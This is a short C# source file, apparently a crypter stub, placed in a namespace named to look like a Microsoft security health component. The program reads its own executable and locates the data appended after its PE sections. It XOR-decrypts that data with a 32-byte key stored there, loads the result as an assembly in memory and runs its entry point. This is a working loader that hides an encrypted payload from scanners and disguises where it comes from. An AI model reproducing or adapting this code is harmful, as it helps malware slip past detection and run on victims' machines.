using System;
using System.IO;
using System.Reflection;
using System.Threading.Tasks;

namespace Microsoft.Security.Health
{
    static class Program
    {
        static void Main(string[] args)
        {
            var data = File.ReadAllBytes(Assembly.GetExecutingAssembly().Location);

            int pe = BitConverter.ToInt32(data, 0x3C);
            int ns = BitConverter.ToInt16(data, pe + 6);
            int os = BitConverter.ToInt16(data, pe + 24);
            int ss = pe + 24 + os;

            int end = 0;
            for (int i = 0; i < ns; i++)
            {
                int o = ss + i * 40;
                int e = BitConverter.ToInt32(data, o + 20) + BitConverter.ToInt32(data, o + 16);
                if (e > end) end = e;
            }

            if (end >= data.Length - 32) return;

            byte[] k = new byte[32];
            Buffer.BlockCopy(data, end, k, 0, 32);

            byte[] pl = new byte[data.Length - end - 32];
            for (int i = 0; i < pl.Length; i++)
                pl[i] = (byte)(data[end + 32 + i] ^ k[i % 32]);

            Assembly asm = Assembly.Load(pl);
            MethodInfo entry = asm.EntryPoint;
            if (entry == null) return;

            object[] p = entry.GetParameters().Length > 0
                ? new object[] { args }
                : null;

            object result = entry.Invoke(null, p);
            if (result is Task task)
                task.GetAwaiter().GetResult();
        }
    }
}
